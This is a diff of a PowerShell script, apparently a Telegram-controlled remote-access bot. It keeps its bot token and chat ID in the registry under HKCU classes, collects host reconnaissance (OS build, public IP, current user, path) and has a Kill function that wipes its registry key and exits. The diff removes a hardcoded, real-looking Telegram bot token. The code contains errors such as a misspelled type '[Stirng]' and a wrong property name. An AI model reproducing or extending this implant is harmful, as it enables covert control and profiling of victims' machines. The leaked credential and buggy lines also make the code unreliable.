@@ -1,10 +1,11 @@
 #########################################
-## Confiuración del Bot
+## Configuración del Bot
 #########################################
 function New-MyTelegramConfiguration{
+    param([Stirng]$ApiToken)
     $RegKey = "HKCU:\Software\classes\MyTelegram"
     New-Item -Path $RegKey -Force | Out-Null
-    New-ItemProperty $RegKey -Name 'BotKey' -Value "1572077157:AAHg8ChqgDgiJl092Ydz0q6AgNFSJQoHQik" -Force | Out-Null
+    New-ItemProperty $RegKey -Name 'BotKey' -Value $ApiToken -Force | Out-Null
     New-ItemProperty $RegKey -Name 'ChatID' -Value "685749607" -Force | Out-Null
     New-ItemProperty $RegKey -Name 'LastUpdateID' -Value 0 -Force | Out-Null
 }
@@ -124,4 +125,33 @@ function Get-RandomPath{
     $ruta = $env:TEMP
     $ruta += $word
     return $ruta
+}
+
+function Get-SystemInfo{
+    $propeties = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | Select-Object ProductName, ReleaseId, CurrentBuild 
+    $system = $propeties.ProductName + " " + $propeties.Released + $propeties.CurrentBuild
+    $ip = '[+] Public IP: ' + $(Get-PublicIP)
+    $cu = "[+] Current user: " + $(whoami)
+    $cp = "[+] Current path: " + $(pwd)
+    $systeminfo = $system + "`n" + $ip + "`n" + $cu + "`n" + $cp
+
+    return $systeminfo
+}
+
+function Get-PublicIP{
+    $ip = ''
+    try{
+        $response = New-Request -URL 'http://checkip.dyndns.com/'
+        $ip = $response | Select-String -Pattern '\d+.\d+.\d+.\d+' | foreach {$_.Matches.Groups[0].Value}
+    } catch [System.Exception] {
+        return 
+    }
+
+    return $ip
+}
+
+function Kill{
+    $RegKey = "HKCU:\Software\classes\MyTelegram"
+    Remove-Item -Path $RegKey -Force | Out-Null
+    exit
 }
